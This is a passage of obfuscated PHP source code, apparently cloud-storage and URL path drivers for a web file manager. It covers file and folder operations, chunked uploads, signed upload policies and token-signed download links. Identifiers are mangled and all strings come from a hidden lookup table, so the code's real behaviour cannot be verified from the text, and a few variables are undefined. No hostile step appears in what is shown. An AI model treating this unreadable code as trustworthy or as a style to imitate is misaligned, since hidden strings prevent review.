array($à‘Àüèú[1550] => $à‘Àüèú[1551], $à‘Àüèú[1552] => $à‘Àüèú[1553], $à‘Àüèú[1554] => $à‘Àüèú[1553], $à‘Àüèú[1555] => $à‘Àüèú[1556], $à‘Àüèú[1557] => $à‘Àüèú[1558], $à‘Àüèú[1559] => $à‘Àüèú[1560], $à‘Àüèú[1561] => $à‘Àüèú[1562]); return isset($«£Õä¸²[$ÚÈÎÈ]) ? $«£Õä¸²[$ÚÈÎÈ] : $ÚÈÎÈ; } public function mkfile($§ñÅÅ™æ, $…ó¦¨†® = '', $ı Éåş‘ = REPEAT_RENAME) { if ($this->setContent($§ñÅÅ™æ, $…ó¦¨†®)) { return $this->getPathOuter($§ñÅÅ™æ); } return !1; } public function mkdir($³úï­ï, $º¯—£ = REPEAT_SKIP) { $Ò§§‹³ =& $_SERVER[Š—Â“œÔ]; $ÙîÃ²Ú® = trim($³úï­ï, $Ò§§‹³[8]); if ($this->_isFolder($ÙîÃ²Ú®)) { return $this->getPathOuter($ÙîÃ²Ú®); } $íÑàƒğÓ = array($Ò§§‹³[1563]); $¶èØ¿×§ = $this->ussRequest($ÙîÃ²Ú®, $Ò§§‹³[290], !1, $íÑàƒğÓ); return $¶èØ¿×§[$Ò§§‹³[1294]] ? $this->getPathOuter($ÙîÃ²Ú®) : !1; } public function copyFile($¶‚ä®§, $ï©ÂûÀ‹) { $®àÅôŠ =& $_SERVER[Š—Â“œÔ]; $ê²ïşï‰ = array($®àÅôŠ[1564] . "\x2f{$this->bucket}\57{$¶‚ä®§}", $®àÅôŠ[1565]); $•ÖÊÊÎ¬ = $this->ussRequest($ï©ÂûÀ‹, $®àÅôŠ[255], !1, $ê²ïşï‰); return $•ÖÊÊÎ¬[$®àÅôŠ[1294]] ? !0 : $this->getPathOuter($ï©ÂûÀ‹); } public function moveFile($»ü€é, $¯¥”ôÙ÷) { $·Á®®„“ =& $_SERVER[Š—Â“œÔ]; $ŞÏøûöÙ = array($·Á®®„“[1566] . "\x2f{$this->bucket}\57{$»ü€é}", $·Á®®„“[1565]); $¤Œè‘ßÒ = $this->ussRequest($¯¥”ôÙ÷, $·Á®®„“[255], !1, $ŞÏøûöÙ); return $¤Œè‘ßÒ[$·Á®®„“[1294]] ? !0 : $this->getPathOuter($¯¥”ôÙ÷); } public function delFile($ÇªÄ¤Òœ) { $şÀôûÕÃ =& $_SERVER[Š—Â“œÔ]; $Ö“³°Üœ = $this->ussRequest($ÇªÄ¤Òœ, $şÀôûÕÃ[1567]); return $Ö“³°Üœ[$şÀôûÕÃ[1294]] ? !0 : !1; } public function delFolder($‡½ò”€…) { $ç¼‚Ù³¾ =& $_SERVER[Š—Â“œÔ]; if (!$this->exist($‡½ò”€…)) { return !0; } $this->listItemCache = !1; $§‘˜Ôß = $™¬¼ºÓµ = array(); $this->fileList($‡½ò”€…, $§‘˜Ôß, $™¬¼ºÓµ, !0); $this->listItemCache = !0; foreach ($™¬¼ºÓµ as $õ‚ÎÊ¡Ù) { $©³¬‰é = $this->ussRequest($õ‚ÎÊ¡Ù[$ç¼‚Ù³¾[32]], $ç¼‚Ù³¾[1567]); if (!$©³¬‰é[$ç¼‚Ù³¾[1294]]) { return !1; } } usort($§‘˜Ôß, function ($†½ˆç¡, $‰Ë÷÷–) { $ğÇ†É¾€ =& $_SERVER[Š—Â“œÔ]; return substr_count($‰Ë÷÷–, $ğÇ†É¾€[8]) - substr_count($†½ˆç¡, $ğÇ†É¾€[8]); }); foreach ($§‘˜Ôß as $êôûƒ„Ø) { $©³¬‰é = $this->ussRequest($êôûƒ„Ø, $ç¼‚Ù³¾[1567]); if (!$©³¬‰é[$ç¼‚Ù³¾[1294]]) { return !1; } } $©³¬‰é = $this->ussRequest($‡½ò”€…, $ç¼‚Ù³¾[1567]); return $©³¬‰é[$ç¼‚Ù³¾[1294]]; } public function rename($ıÙ·Í½õ, $ÂøØ¿û) { if ($this->isFile($ıÙ·Í½õ)) { $ÂøØ¿û = get_path_father($ıÙ·Í½õ) . $ÂøØ¿û; return $this->moveFile($ıÙ·Í½õ, $ÂøØ¿û); } return $this->renameObject($ıÙ·Í½õ, $ÂøØ¿û); } public function fileInfo($¾ù²®¨§, $ªäÜ€³œ = false, $¹ûÇ« È = array()) { $í«²ß„µ =& $_SERVER[Š—Â“œÔ]; $Åˆè½«Ï = array($í«²ß„µ[32] => $this->pathThis($¾ù²®¨§), $í«²ß„µ[87] => $this->getPathOuter($í«²ß„µ[8] . $¾ù²®¨§), $í«²ß„µ[33] => $í«²ß„µ[232], $í«²ß„µ[79] => isset($¹ûÇ« È[$í«²ß„µ[79]]) ? $¹ûÇ« È[$í«²ß„µ[79]] : 0, $í«²ß„µ[169] => $this->ext($¾ù²®¨§)); if ($ªäÜ€³œ) { return $Åˆè½«Ï; } $Åˆè½«Ï[$í«²ß„µ[233]] = $Åˆè½«Ï[$í«²ß„µ[88]] = 0; $Åˆè½«Ï[$í«²ß„µ[234]] = $Åˆè½«Ï[$í«²ß„µ[235]] = !0; if (empty($¹ûÇ« È)) { $¹ûÇ« È = $this->objectMeta($¾ù²®¨§); if (!$¹ûÇ« È) { return $Åˆè½«Ï; } } $Åˆè½«Ï[$í«²ß„µ[233]] = intval($¹ûÇ« È[$í«²ß„µ[1568]]); $Åˆè½«Ï[$í«²ß„µ[88]] = intval($¹ûÇ« È[$í«²ß„µ[1569]]); $Åˆè½«Ï[$í«²ß„µ[79]] = $¹ûÇ« È[$í«²ß„µ[79]]; return $Åˆè½«Ï; } public function folderInfo($¾“É›Ù, $…ÕÄñû = false) { $ÂÁ¢æË =& $_SERVER[Š—Â“œÔ]; $ä”šõ„ì = array($ÂÁ¢æË[32] => $this->pathThis($¾“É›Ù), $ÂÁ¢æË[87] => $this->getPathOuter($ÂÁ¢æË[8] . $¾“É›Ù), $ÂÁ¢æË[33] => $ÂÁ¢æË[78]); if ($…ÕÄñû) { return $ä”šõ„ì; } $ä”šõ„ì[$ÂÁ¢æË[233]] = $ä”šõ„ì[$ÂÁ¢æË[88]] = 0; $ä”šõ„ì[$ÂÁ¢æË[234]] = $ä”šõ„ì[$ÂÁ¢æË[235]] = !0; if (empty($¬éş×›Ä)) { $¬éş×›Ä = $this->objectMeta($¾“É›Ù); if (!$¬éş×›Ä) { return $ä”šõ„ì; } } $ä”šõ„ì[$ÂÁ¢æË[233]] = intval($¬éş×›Ä[$ÂÁ¢æË[1568]]); $ä”šõ„ì[$ÂÁ¢æË[88]] = intval($¬éş×›Ä[$ÂÁ¢æË[1569]]); return $ä”šõ„ì; } private function listObjs($¼ªì¢‘§, $ƒåã…¤÷ = 0, $é¸›åÊÇ = 1000) { $—€¤ô¬¶ =& $_SERVER[Š—Â“œÔ]; $¹í´Şéˆ = array($—€¤ô¬¶[1570], $—€¤ô¬¶[1571] . $é¸›åÊÇ); if ($ƒåã…¤÷) { $¹í´Şéˆ[] = $—€¤ô¬¶[1572] . $ƒåã…¤÷; } $´ã•¥¥ = $this->ussRequest($¼ªì¢‘§, $—€¤ô¬¶[1494], !1, $¹í´Şéˆ); return !$´ã•¥¥[$—€¤ô¬¶[1294]] ? !1 : $´ã•¥¥[$—€¤ô¬¶[1284]]; } private function fileList($úŠß¤åó, &$ì§Ú²æó, &$‚ŸÂ’•–, $¬¨í½½á = false) { $¤ª»”òš =& $_SERVER[Š—Â“œÔ]; $ÙÍ¡Ğ¹— = $¤ª»”òš[12]; $ƒÒ¦†Ê = 1000; $øÈÚêß = rtrim($úŠß¤åó, $¤ª»”òš[8]) . $¤ª»”òš[8]; while (!0) { check_abort(); $ëÎµÂİÓ = $this->listObjs($úŠß¤åó, $ÙÍ¡Ğ¹—, $ƒÒ¦†Ê); if (!$ëÎµÂİÓ) { return !1; } $ÙÍ¡Ğ¹— = isset($ëÎµÂİÓ[$¤ª»”òš[1573]]) ? $ëÎµÂİÓ[$¤ª»”òš[1573]] : $¤ª»”òš[12]; $ÖÉşãÂ¨ = isset($ëÎµÂİÓ[$¤ª»”òš[1574]]) ? $ëÎµÂİÓ[$¤ª»”òš[1574]] : array(); foreach ($ÖÉşãÂ¨ as $ô×Óâ) { $–Ï¹²¡ = $ô×Óâ[$¤ª»”òš[33]] == $¤ª»”òš[78] ? !0 : !1; $äÙ©”÷ş = ltrim($øÈÚêß . $ô×Óâ[$¤ª»”òš[32]], $¤ª»”òš[8]) . ($–Ï¹²¡ ? $¤ª»”òš[8] : $¤ª»”òš[12]); $ñıëİì = array($¤ª»”òš[32] => $äÙ©”÷ş, $¤ª»”òš[33] => $–Ï¹²¡ ? $¤ª»”òš[78] : $¤ª»”òš[232], $¤ª»”òš[79] => $ô×Óâ[$¤ª»”òš[414]], $¤ª»”òš[1569] => $ô×Óâ[$¤ª»”òš[1575]]); $this->cacheMethodInfoSet($äÙ©”÷ş, $–Ï¹²¡, $ñıëİì); if ($–Ï¹²¡) { $ì§Ú²æó[] = $äÙ©”÷ş; if ($¬¨í½½á) { $this->fileList($äÙ©”÷ş, $ì§Ú²æó, $‚ŸÂ’•–, $¬¨í½½á); } continue; } $‚ŸÂ’•–[] = $ñıëİì; } if (count($ÖÉşãÂ¨) < $ƒÒ¦†Ê) { break; } } $this->cacheMethodInfoSet($úŠß¤åó, !0); } public function listPath($®ºòüù¼, $µæ‡¿¸ = false) { $ğµ‘âÒ¥ =& $_SERVER[Š—Â“œÔ]; $¼—×áäÍ = $§ãØùÉ› = array(); $this->fileList($®ºòüù¼, $¼—×áäÍ, $§ãØùÉ›); foreach ($¼—×áäÍ as $áùãéä => $ÄïÄÄÂû) { $¼—×áäÍ[$áùãéä] = $this->folderInfo($ÄïÄÄÂû, $µæ‡¿¸); } foreach ($§ãØùÉ› as $áùãéä => $ÄïÄÄÂû) { $§ãØùÉ›[$áùãéä] = $this->fileInfo($ÄïÄÄÂû[$ğµ‘âÒ¥[32]], $µæ‡¿¸, $ÄïÄÄÂû); } return array($ğµ‘âÒ¥[85] => $¼—×áäÍ, $ğµ‘âÒ¥[86] => $§ãØùÉ›); } public function has($†¥ÜòÂæ, $£ ‚ªÍ = false, $’«‘ûÉ¿ = true) { $¼…°ÕÕ˜ =& $_SERVER[Š—Â“œÔ]; $¥ğã€Ü­ = $¼…°ÕÕ˜[12]; $Ò‡„Òñ = 500; $éÜô©ø˜ = 0; $Âí•‰ÁÎ = 0; $£È¿òôû = rtrim($†¥ÜòÂæ, $¼…°ÕÕ˜[8]) . $¼…°ÕÕ˜[8]; while (!0) { check_abort(); $õ«™½«Û = $this->listObjs($†¥ÜòÂæ, $¥ğã€Ü­, $Ò‡„Òñ); if (!$õ«™½«Û) { return !1; } $¥ğã€Ü­ = isset($õ«™½«Û[$¼…°ÕÕ˜[1573]]) ? $õ«™½«Û[$¼…°ÕÕ˜[1573]] : $¼…°ÕÕ˜[12]; $îßÛ£ñ¦ = isset($õ«™½«Û[$¼…°ÕÕ˜[1574]]) ? $õ«™½«Û[$¼…°ÕÕ˜[1574]] : array(); if (empty($îßÛ£ñ¦)) { break; } $ÇŸ¼Ë¬£ = array_filter($îßÛ£ñ¦, function ($îƒ†¶Æ±) { $ª¿ÄÑ ë =& $_SERVER[Š—Â“œÔ]; return $îƒ†¶Æ±[$ª¿ÄÑ ë[33]] == $ª¿ÄÑ ë[78]; }); $Æ¼æ¼ÆŒ = count($îßÛ£ñ¦); $ÇŸ¼Ë¬£ = count($ÇŸ¼Ë¬£); $ÙÇ¯•Œô = $Æ¼æ¼ÆŒ - $ÇŸ¼Ë¬£; if ($£ ‚ªÍ) { $Âí•‰ÁÎ += $ÇŸ¼Ë¬£; $éÜô©ø˜ += $ÙÇ¯•Œô; if ($Æ¼æ¼ÆŒ < $Ò‡„Òñ) { break; } continue; } if ($’«‘ûÉ¿) { if ($ÙÇ¯•Œô) { return !0; } } else { if ($ÇŸ¼Ë¬£) { return !0; } } if ($Æ¼æ¼ÆŒ < $Ò‡„Òñ) { break; } } if ($£ ‚ªÍ) { return array($¼…°ÕÕ˜[241] => $éÜô©ø˜, $¼…°ÕÕ˜[242] => $Âí•‰ÁÎ); } return !1; } public function listAll($ìòŒì”å) { $ËÁ¬°Æğ =& $_SERVER[Š—Â“œÔ]; $ò–ğìù´ = $çÆñ¥¢å = array(); $this->fileList($ìòŒì”å, $ò–ğìù´, $çÆñ¥¢å, !0); $äŸÊŒÖ = array_to_keyvalue($çÆñ¥¢å, $ËÁ¬°Æğ[32]); foreach ($ò–ğìù´ as $¾‹İØ—ú) { if (is_string($¾‹İØ—ú)) { $äŸÊŒÖ[$¾‹İØ—ú] = array($ËÁ¬°Æğ[79] => 0); } } return $this->listAllFiles($ìòŒì”å, $äŸÊŒÖ); } public function canRead($˜›ÌÊ­Ç) { return $this->exist($˜›ÌÊ­Ç) ? !0 : !1; } public function canWrite($ª…šöòÑ) { return $this->exist($ª…šöòÑ) ? !0 : !1; } public function getContent($îìŠ•Ô) { return $this->fileSubstr($îìŠ•Ô, 0, -1); } public function setContent($ÊîÔĞ’à, $²œĞ½òÄ = '') { $§øš¡â´ =& $_SERVER[Š—Â“œÔ]; if (!$²œĞ½òÄ) { $›óæîè = $this->ussRequest($ÊîÔĞ’à, $§øš¡â´[290]); return $›óæîè[$§øš¡â´[1294]]; } $éÓ£€¹ = $this->tempFile($this->pathThis($ÊîÔĞ’à)); file_put_contents($éÓ£€¹, $²œĞ½òÄ); if ($this->upload($ÊîÔĞ’à, $éÓ£€¹)) { $this->tempFileRemve($éÓ£€¹); return !0; } return !1; } public function fileSubstr($ü‘š®¤“, $¸ªÂ¥ğÑ, $¡ãëÍŸ¤) { $™Ş—  =& $_SERVER[Š—Â“œÔ]; if (!($…÷äªôï = $this->link($ü‘š®¤“))) { return !1; } $¬Ñùºå¿ = !1; if ($¡ãëÍŸ¤ > 0) { $¥ïÍ„ğ‡ = $¸ªÂ¥ğÑ + $¡ãëÍŸ¤ - 1; $¬Ñùºå¿ = array($™Ş— [1534] . $¸ªÂ¥ğÑ . $™Ş— [464] . $¥ïÍ„ğ‡); } $Î— = url_request($…÷äªôï, $™Ş— [1494], !1, $¬Ñùºå¿); return $Î—[$™Ş— [817]] ? $Î—[$™Ş— [1284]] : !1; } public function upload($Í³×àä¿, $²×ı’˜ñ, $€¥™³æ = false, $“ÓºÕ¡¨ = REPEAT_REPLACE) { $Ö©¦öœÄ =& $_SERVER[Š—Â“œÔ]; $íèøš‡ = IO::size($²×ı’˜ñ); if ($íèøš‡ <= 1024 * 1024 * 200) { $•ÓÇ“şº = array($Ö©¦öœÄ[1576] . $²×ı’˜ñ); $ºõşŠŞú = $this->ussRequest($Í³×àä¿, $Ö©¦öœÄ[255], $•ÓÇ“şº); return $ºõşŠŞú[$Ö©¦öœÄ[1294]] ? $this->getPathOuter($Í³×àä¿) : !1; } $ıø¼ú£´ = 1024 * 1024 * 10; $ıšœöÚ = array($Ö©¦öœÄ[1577], $Ö©¦öœÄ[1578] . $íèøš‡, $Ö©¦öœÄ[1579], $Ö©¦öœÄ[1580] . $ıø¼ú£´); $ºõşŠŞú = $this->ussRequest($Í³×àä¿, $Ö©¦öœÄ[255], !1, $ıšœöÚ); if (!$ºõşŠŞú[$Ö©¦öœÄ[1294]]) { return !1; } $ˆßà”ƒ„ = $ºõşŠŞú[$Ö©¦öœÄ[1284]]; $ÙÍ²”®ç = 0; $¨¦†Å¬ó = $ˆßà”ƒ„[$Ö©¦öœÄ[1581]]; $úä»½Ò€ = fopen($²×ı’˜ñ, $Ö©¦öœÄ[1457]); if (!$úä»½Ò€) { return !1; } do { $š«Üâ©İ = $ˆßà”ƒ„[$Ö©¦öœÄ[1582]]; fseek_64($úä»½Ò€, $ÙÍ²”®ç); $ŞÃ²®®ê = fread($úä»½Ò€, $š«Üâ©İ); $âŸóäğÕ = 0; do { $âŸóäğÕ++; $ˆßà”ƒ„ = $this->uploadPart($Í³×àä¿, $ˆßà”ƒ„, $ŞÃ²®®ê); } while (!$ˆßà”ƒ„ && $âŸóäğÕ < 3); if (!$ˆßà”ƒ„) { return !1; } $¨¦†Å¬ó = $ˆßà”ƒ„[$Ö©¦öœÄ[1581]]; $ÙÍ²”®ç += $š«Üâ©İ; } while ($¨¦†Å¬ó != -1); fclose($úä»½Ò€); $ıšœöÚ = array($Ö©¦öœÄ[1583], $Ö©¦öœÄ[1584] . $ˆßà”ƒ„[$Ö©¦öœÄ[1585]], $Ö©¦öœÄ[1579]); $ºõşŠŞú = $this->ussRequest($Í³×àä¿, $Ö©¦öœÄ[255], !1, $ıšœöÚ); return $ºõşŠŞú[$Ö©¦öœÄ[1294]] ? $this->getPathOuter($ÚÙÍ›Å) : !1; } private function uploadPart($ùåïºèô, $Õåš¤±Ë, &$–—½‰©) { $âéÛËû£ =& $_SERVER[Š—Â“œÔ]; $ßªØ³á = array($âéÛËû£[1586], $âéÛËû£[1584] . $Õåš¤±Ë[$âéÛËû£[1585]], $âéÛËû£[1587] . $Õåš¤±Ë[$âéÛËû£[1581]], $âéÛËû£[146] . $Õåš¤±Ë[$âéÛËû£[1582]]); $¢íÑ“Àä = $this->ussRequest($ùåïºèô, $âéÛËû£[255], $–—½‰©, $ßªØ³á); return !$¢íÑ“Àä[$âéÛËû£[1294]] ? $¢íÑ“Àä[$âéÛËû£[1294]] : $¢íÑ“Àä[$âéÛËû£[1284]]; } public function uploadFormData($©½¤¬ğª, $æüÓ»à = 3600) { return $this->uploadPolicy($©½¤¬ğª, $æüÓ»à); } public function uploadMultiData($Ê«Ã¡©, $ÛŠàŸˆö = 3600) { $†¯íÖÄ¤ =& $_SERVER[Š—Â“œÔ]; $˜ÁãæöË = (int) $GLOBALS[$†¯íÖÄ¤[7]][$†¯íÖÄ¤[79]]; return $this->uploadPolicy($Ê«Ã¡©, $ÛŠàŸˆö, $˜ÁãæöË); } private function uploadPolicy($§İíúÖ, $£ş×ƒ–ş = 3600, $åŒ®”Ê„ = 0) { $µšìçñØ =& $_SERVER[Š—Â“œÔ]; $—§•ğ = $µšìçñØ[8] . $this->bucket; $‰­²´æ = gmdate($µšìçñØ[1492]); $Ä¶­Ï’¤ = array($µšìçñØ[1588] => $this->bucket, $µšìçñØ[1589] => $§İíúÖ, $µšìçñØ[1590] => time() + $£ş×ƒ–ş, $µšìçñØ[1591] => $‰­²´æ); if ($åŒ®”Ê„) { $Ä¶­Ï’¤[$µšìçñØ[1477]] = $åŒ®”Ê„; } $Ê¹¬–è” = base64_encode(json_encode($Ä¶­Ï’¤)); $š¸ÊøâÙ = base64_encode(hash_hmac($µšìçñØ[1545], "\120\x4f\x53\124\x26{$—§•ğ}\46{$‰­²´æ}\x26{$Ê¹¬–è”}", md5("{$this->userpass}"), !0)); $ò•’¯ûË = array($µšìçñØ[279] => $Ê¹¬–è”, $µšìçñØ[1592] => "\125\x50\131\x55\116\40{$this->username}\x3a{$š¸ÊøâÙ}", $µšìçñØ[208] => $this->endpoint . $—§•ğ); return $ò•’¯ûË; } public function download($¯Şş¥£, $©ÁÌ÷¤‘) { $¼´ÏÊ»‰ = IO::getPathInner(IO::mkfile($©ÁÌ÷¤‘)); if (!($şğ”íïÜ = $this->link($¯Şş¥£))) { return !1; } $’ğÈÀ»‹ = 0; $Èœ¥ûë˜ = 1024 * 200; $ÔêùÇÅî = fopen($¼´ÏÊ»‰, $_SERVER[Š—Â“œÔ][1540]); while (!0) { $ĞêÈ—Éµ = $this->fileSubstr($¯Şş¥£, $’ğÈÀ»‹, $Èœ¥ûë˜); if ($ĞêÈ—Éµ === !1) { return !1; } fwrite($ÔêùÇÅî, $ĞêÈ—Éµ); $’ğÈÀ»‹ += $Èœ¥ûë˜; if (strlen($ĞêÈ—Éµ) < $Èœ¥ûë˜) { break; } } fclose($ÔêùÇÅî); return $©ÁÌ÷¤‘; } public function link($ƒîâäÂ, $¿ˆÂÄ‰ = array()) { $©Å÷»” =& $_SERVER[Š—Â“œÔ]; $ƒîâäÂ = trim($ƒîâäÂ, $©Å÷»”[8]); if (!empty($this->token)) { $¾ÑØå = strtotime(date($©Å÷»”[1593])); $şèÍ¸¸ = substr(md5($this->token . $©Å÷»”[286] . $¾ÑØå . $©Å÷»”[1594] . $ƒîâäÂ), 12, 8) . $¾ÑØå; $¿ˆÂÄ‰[] = $©Å÷»”[1595] . $şèÍ¸¸; } $Ëœ·»Ú‰ = !empty($¿ˆÂÄ‰) ? $©Å÷»”[76] . implode($©Å÷»”[286], $¿ˆÂÄ‰) : $©Å÷»”[12]; return $this->getHost() . $©Å÷»”[8] . $this->pathEncode($ƒîâäÂ) . $Ëœ·»Ú‰; } public function fileOut($¸€—ËŞµ, $è¼ÆÒñ… = false, $ªËã´öè = false, $ÊäÃ‚ô = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¸€—ËŞµ, $è¼ÆÒñ…, $ªËã´öè, $ÊäÃ‚ô); } if (!$ªËã´öè) { $ªËã´öè = $this->pathThis($¸€—ËŞµ); } $Õ®†›àø = $è¼ÆÒñ… ? array($_SERVER[Š—Â“œÔ][1596] . rawurlencode($ªËã´öè)) : array(); $¨»¨û’ê = $this->link($¸€—ËŞµ, $Õ®†›àø); $this->fileOutLink($¨»¨û’ê); } public function fileOutServer($ñü¸«ùÊ, $ÔïÒóÏ‹ = false, $‚ä¡‡Øœ = false, $ü–íÊçÔ = '') { parent::fileOut($ñü¸«ùÊ, $ÔïÒóÏ‹, $‚ä¡‡Øœ, $ü–íÊçÔ); } public function fileOutImage($Óˆ³ç›Õ, $¡ü¦øÚı = 250) { $®‹¾ÊÔ· = $this->link($Óˆ³ç›Õ . $_SERVER[Š—Â“œÔ][1597] . $¡ü¦øÚı); $this->fileOutLink($®‹¾ÊÔ·); } public function fileOutImageServer($¥°¦ˆ‹˜, $À›¦™ïš = 250) { parent::fileOutImage($¥°¦ˆ‹˜, $À›¦™ïš); } public function hashMd5($ÄÎÙıÁı) { $…åã¹ß˜ =& $_SERVER[Š—Â“œÔ]; $¾°´Îá™ = $this->_objectMeta($ÄÎÙıÁı); return isset($¾°´Îá™[$…åã¹ß˜[247]]) ? $¾°´Îá™[$…åã¹ß˜[247]] : !1; } public function size($š…©‹…) { $±œÓ¥ë‚ = $this->objectMeta($š…©‹…); return $±œÓ¥ë‚ ? $±œÓ¥ë‚[$_SERVER[Š—Â“œÔ][79]] : 0; } public function info($ªãõİ…²) { if ($this->isFolder($ªãõİ…²)) { return $this->folderInfo($ªãõİ…²); } else { if ($this->isFile($ªãõİ…²)) { return $this->fileInfo($ªãõİ…²); } } return !1; } public function exist($ã•¼øÈÈ) { return $this->isFile($ã•¼øÈÈ) || $this->isFolder($ã•¼øÈÈ); } public function isFile($ùøÇ¿ø´) { return !$this->isFolder($ùøÇ¿ø´) && $this->objectMeta($ùøÇ¿ø´); } public function isFolder($Şß¡ô®®) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][179], $Şß¡ô®®); } protected function objectMeta($ˆ–¶¬´ü) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][181], $ˆ–¶¬´ü); } protected function _objectMeta($Á°µèŒ¾) { $À÷üîä¯ =& $_SERVER[Š—Â“œÔ]; if ($Á°µèŒ¾ == $À÷üîä¯[12] || $Á°µèŒ¾ == $À÷üîä¯[8]) { return array(); } $…¸şÌ‡ = $this->ussRequest($Á°µèŒ¾, $À÷üîä¯[1598]); if (!$…¸şÌ‡[$À÷üîä¯[1294]]) { return null; } $£«Ş™ïß = isset($…¸şÌ‡[$À÷üîä¯[1284]]) ? $…¸şÌ‡[$À÷üîä¯[1284]] : array(); if (!isset($£«Ş™ïß[$À÷üîä¯[1599]])) { return null; } $éÇ––í = array($À÷üîä¯[33] => isset($£«Ş™ïß[$À÷üîä¯[1599]]) ? $£«Ş™ïß[$À÷üîä¯[1599]] : null, $À÷üîä¯[79] => isset($£«Ş™ïß[$À÷üîä¯[1600]]) ? $£«Ş™ïß[$À÷üîä¯[1600]] : null, $À÷üîä¯[247] => isset($£«Ş™ïß[$À÷üîä¯[1601]]) ? $£«Ş™ïß[$À÷üîä¯[1601]] : null, $À÷üîä¯[1568] => isset($£«Ş™ïß[$À÷üîä¯[1602]]) ? $£«Ş™ïß[$À÷üîä¯[1602]] : null); $éÇ––í[$À÷üîä¯[1569]] = isset($£«Ş™ïß[$À÷üîä¯[1603]]) ? strtotime($£«Ş™ïß[$À÷üîä¯[1603]]) : $éÇ––í[$À÷üîä¯[1568]]; return $éÇ––í; } protected function _isFolder($¨ì¾Ø™é) { $¿¤İŒ’ =& $_SERVER[Š—Â“œÔ]; if ($¨ì¾Ø™é == $¿¤İŒ’[12] || $¨ì¾Ø™é == $¿¤İŒ’[8]) { return !0; } $ûÆĞĞÔõ = $this->_objectMeta($¨ì¾Ø™é); return isset($ûÆĞĞÔõ[$¿¤İŒ’[33]]) && $ûÆĞĞÔõ[$¿¤İŒ’[33]] == $¿¤İŒ’[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($„Ñ„ó´Ì = false) { } public function exist($æ¡»Ù“) { $ƒ±èèâ± = $this->info($æ¡»Ù“); return $ƒ±èèâ±[$_SERVER[Š—Â“œÔ][234]]; } public function isFile($ÙÌ£™¼–) { $İÜ®¨¾Ğ = $this->info($ÙÌ£™¼–); return $İÜ®¨¾Ğ[$_SERVER[Š—Â“œÔ][234]]; } public function isFolder($ôşçª¨Å) { return !1; } public function size($„†èû¤®) { $–»ªå¿ª = $this->info($„†èû¤®); return $–»ªå¿ª[$_SERVER[Š—Â“œÔ][79]]; } public function info($ªÆÛ¢Ğ) { return $this->infoParse($ªÆÛ¢Ğ); } public function infoAuth($Úİü‹Ã­) { return $this->infoParse($Úİü‹Ã­); } public function infoWithChildren($ÍõÙƒ¤æ) { return $this->infoParse($ÍõÙƒ¤æ); } public function infoFull($ø‰‰£›É) { return $this->infoParse($ø‰‰£›É); } private function infoParse($ê™Ú‡ÎÊ) { $‚şÛ‡Ó =& $_SERVER[Š—Â“œÔ]; $Ù½¾ç¿ = $this->header($ê™Ú‡ÎÊ); if (!$Ù½¾ç¿ || !$Ù½¾ç¿[$‚şÛ‡Ó[817]]) { return !1; } $á™ÎÄª = _get($Ù½¾ç¿, $‚şÛ‡Ó[414], 0); $Úõ›ÍÙñ = array($‚şÛ‡Ó[32] => $Ù½¾ç¿[$‚şÛ‡Ó[32]], $‚şÛ‡Ó[87] => $ê™Ú‡ÎÊ, $‚şÛ‡Ó[33] => $‚şÛ‡Ó[232], $‚şÛ‡Ó[79] => intval($á™ÎÄª), $‚şÛ‡Ó[169] => get_path_ext($Ù½¾ç¿[$‚şÛ‡Ó[32]]), $‚şÛ‡Ó[1454] => $á™ÎÄª > 0 && $Ù½¾ç¿[$‚şÛ‡Ó[1604]], $‚şÛ‡Ó[1455] => !1); return $Úõ›ÍÙñ; } private function header($¬ª™’¬Ë) { $ã˜§…¥Ú =& $_SERVER[Š—Â“œÔ]; if (isset(self::$_cacheHeader[$¬ª™’¬Ë])) { return self::$_cacheHeader[$¬ª™’¬Ë]; } $¢æ¤¸Êî = isset($GLOBALS[$ã˜§…¥Ú[1605]]) ? $GLOBALS[$ã˜§…¥Ú[1605]] : !1; $GLOBALS[$ã˜§…¥Ú[1605]] = !0; self::$_cacheHeader[$¬ª™’¬Ë] = url_header($¬ª™’¬Ë); $GLOBALS[$ã˜§…¥Ú[1605]] = $¢æ¤¸Êî; return self::$_cacheHeader[$¬ª™’¬Ë]; } public function hashSimple($„«§¾Ùä, $óò³¶³ = false) { $—²î¶È… =& $_SERVER[Š—Â“œÔ]; $™¹íÍÎÔ = $this->info($„«§¾Ùä); if (!$™¹íÍÎÔ || !$™¹íÍÎÔ[$—²î¶È…[234]]) { return !1; } $ıÌé¢øÃ = $™¹íÍÎÔ[$—²î¶È…[79]]; $´–¿öæ¯ = 200; $Ä‰“ıõØ = 50; if ($ıÌé¢øÃ <= $´–¿öæ¯ * $Ä‰“ıõØ) { return md5($this->fileSubstr($„«§¾Ùä, 0, $ıÌé¢øÃ)) . $ıÌé¢øÃ; } $×Á…º²“ = intval($ıÌé¢øÃ / $Ä‰“ıõØ); $ñ®ç¬± = $—²î¶È…[12]; $„®„¹Ò… = timeFloat(); $“ÂÒşÙœ = 15; for ($Å‡×†Ûœ = 0; $Å‡×†Ûœ < $Ä‰“ıõØ; $Å‡×†Ûœ++) { if (timeFloat() - $„®„¹Ò… > $“ÂÒşÙœ) { return !1; } $¢¬É€¢§ = $this->fileSubstr($„«§¾Ùä, $×Á…º²“ * $Å‡×†Ûœ, $´–¿öæ¯); if (!$¢¬É€¢§) { return !1; } $ñ®ç¬± .= $¢¬É€¢§; } $ñ®ç¬± .= $this->fileSubstr($„«§¾Ùä, $ıÌé¢øÃ - $´–¿öæ¯, $´–¿öæ¯); return md5($ñ®ç¬±) . $ıÌé¢øÃ; } public function getContent($ª”îÍÛ°) { return $this->fileSubstr($ª”îÍÛ°); } public function fileSubstr($Ì‚¶ŠÄ, $™Ó’áø¡ = 0, $ÏÏµ‹¾° = -1) { $¡‚§˜™ß =& $_SERVER[Š—Â“œÔ]; $ç¤Ğ¦Ö = $this->info($Ì‚¶ŠÄ); if (!$ç¤Ğ¦Ö || !$ç¤Ğ¦Ö[$¡‚§˜™ß[234]] && $ç¤Ğ¦Ö[$¡‚§˜™ß[79]] > 1024 * 1024 * 10) { return !1; } if ($ÏÏµ‹¾° === -1) { $ÏÏµ‹¾° = $ç¤Ğ¦Ö[$¡‚§˜™ß[79]]; } if ($ÏÏµ‹¾° == 0) { return $¡‚§˜™ß[12]; } $Õ›¬ = array($¡‚§˜™ß[1606] . $™Ó’áø¡ . $¡‚§˜™ß[853] . ($™Ó’áø¡ + $ÏÏµ‹¾° - 1)); $ÏŞûì™ = 